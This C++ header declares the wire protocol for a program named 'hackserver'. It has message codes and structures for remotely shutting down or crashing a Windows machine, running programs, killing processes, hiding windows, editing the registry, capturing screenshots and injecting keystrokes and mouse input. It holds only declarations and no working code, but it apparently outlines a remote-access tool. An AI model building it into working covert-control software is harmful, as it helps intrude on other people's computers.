#ifndef MYPROTOCOL_H
#define	MYPROTOCOL_H
#include "hackserver.h"
/*
This header file contains declaration of all structures
and Macros related with protocol used by this server.
It also has declaration of all the classes
*/


//-------------------
//Declaration of classes
class CRemoteSock;
class CHackSock;
class CHackServerDlg;
class CHackServer;
//-------------------


typedef struct __FetchBuff
{
	int function;
	int datasize;
	int callback;	
}Fetch,PFetch;
struct paramProcessIntr
{
	Fetch intr;
	void* data;
	CRemoteSock* This;
};
//======System Exit Constant===
#define SYS_SHUTDOWN 1
#define SYS_LOGOFF 2
#define SYS_RESTART 3
#define SYS_BOSD 4
#define SYS_LOCK 5
#define SYS_EXEC 6
#define SYS_SETPRIORITY 7
#define SYS_TERMINATE 8
//=================================

//========Wnd Functions============
#define WNDFN_HIDE	1
#define WNDFN_UNHIDE 2
#define WNDFN_CLOSE 3
#define WNDFN_SETTEXT 4
#define WNDFN_ENABLE 5
#define WNDFN_DISABLE 6
//=================================
//=================================
#define CALLBACK_REGVAL 1		//registry entry callback function index 
#define CALLBACK_WNDFILLINFO 2	//Getting the information about top windows on the system
#define CALLBACK_WNDFN 3		//for performing some window functions (hide/unhide/close/enable/etc)
#define CALLBACK_SYSINFO 4		//for getting system information
#define CALLBACK_SYSCTRL 5		//for System Control
#define CALLBACK_GETDESKTOP	9	//for getting bitmap of desktop
#define CALLBACK_SENDINPUT 11   //for for synthesizing keystrokes, mouse motions, and button clicks.
//===================================================================================

#define FUNCTION_REGVAL 1		//registry entry callback function index 
#define FUNCTION_WNDFILLINFO 2	//Getting the information about top windows on the system
#define FUNCTION_WNDFN 3		//for performing some window functions (hide/unhide/close/enable/etc)
#define FUNCTION_SYSINFO 4		//for getting system information
#define FUNCTION_SYSCTRL 5		//for System Control
#define FUNCTION_MOVEMOUSE 6	//for moving mouse to position i,j  
#define FUNCTION_CLICKMOUSE 7	//for clicking mouse to position i,j
#define FUNCTION_DCLICKMOUSE 8	//for double clicking a mouse at position i,j
#define FUNCTION_GETWNDBMP	9	//for getting bitmap of window
#define FUNCTION_TYPEKEY 10		//for typing keybord to a specific key (WORD)
#define FUCTION_SENDINPUT 11    //for synthesizing keystrokes, mouse motions, and button clicks.
//=================================

struct Add_Key_Reg
{
	char  hKey_str[25];
	char Key[1024];
	char  value[255];
	char  type_str[10];
	char  data[255];
};

struct MyEnumArgv
{
	unsigned long This;
	unsigned long Hwnd;
	unsigned long Parent;
};

struct WndItem 
{
	HWND Hwnd;
	char Text[255];
	char ClassName[64];
	WINDOWINFO  WndInfo;	
};
struct WndFunctionArgv	//for parsing system Window Function Request
{
		unsigned long Hwnd;
		char str[20];
		int fn;
};
struct SysInfoArgv	//for parsing system information request
{
	unsigned long This;
	unsigned int size;
};
struct head_SysInfoArgv		//header of  system information reply
{
	unsigned int BuffSize;
	unsigned long This;
	unsigned int size;
};
struct ProcInfo		//Information of Process
{
	DWORD Pid;
	LONG Pri;
	DWORD ThreadCount;
	char szExe[30] ;
};
struct SysCtrlInfo
{
	unsigned long This;  //callback value (id  of caller)
	BOOL isSucceed;		//is Request succeed 
	int lenPinfo;		//length of pinfo array;

};
struct SysCtrlReq	//Format of request  for any system Control Function
{
	unsigned long This; //callback value (id  of caller)
	int Cmd;			//Command to be executed
	LONG pri;			//priority to set
	DWORD Pid;			//Required if request is about process Manupulation can be null
	char FileName[512]; //Required if some file to be executed
	char CmdLine[512];	//Required if some file to be executed
	char dir[512];		//Required if some file to be executed
	char verb[10];		//Required if some file to be executed
	int CmdShow;		//Required if some file to be executed

};


struct GetWndBmpReq //Format for request for the bitmap of any window
{
	unsigned long This; //callback value
	unsigned long HWnd; //Handle to the Window
};



struct WndBmp
{
	unsigned long This; //callback value(caller ID)
	int success; //is bitmap  retrived or not
	int width;   //width of window (or bitmap)
	int height;	 //height of window (or bitmap)
};

struct SynthInputReply //Return of  function SynthInput
{
	unsigned long This;	//callback value(caller ID)
	int success;		//return value sendinput function
	/*
	The function returns the number of events that it successfully inserted into 
	the keyboard or	mouse input stream. If the function returns zero, the input
	was already blocked by another thread.
	*/
};

struct SynthInputReq //Format of function SynthInput
{
  unsigned long This;	//callback value(caller ID)
  UINT   message;		//type of message
  WPARAM wParam;		//wparam
  LPARAM lParam;		//lparam
  int MsgType;		//Type of Message KeyBoard or Mouse
};
//====================================================================
//this is global function for error reporting


//====================================================================
#endif